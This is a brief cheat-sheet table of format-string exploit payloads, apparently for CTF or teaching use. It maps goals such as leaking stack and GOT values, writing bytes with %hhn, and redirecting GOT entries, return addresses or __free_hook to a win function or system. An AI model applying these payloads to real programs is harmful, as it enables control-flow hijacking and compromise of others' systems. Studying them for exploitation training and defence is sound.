# The fmtstr recipes — payloads by goal


| Goal | Payload |
|---|---|
| confirm | `%p` |
| offset | `AAAAAAAA.%N$p` scan |
| read stack | `%p.%p.%p...` |
| leak GOT[x] | plant got_x; `%N$s` |
| write byte | plant ptr; `%Nc.%N$hhn` |
| write word | 4x %hhn over arg offsets |
| GOT->win | plant got_x; %n with win addr |
| ret->win | leak stack; write saved_ret |
| hook->sys | plant __free_hook; write system |
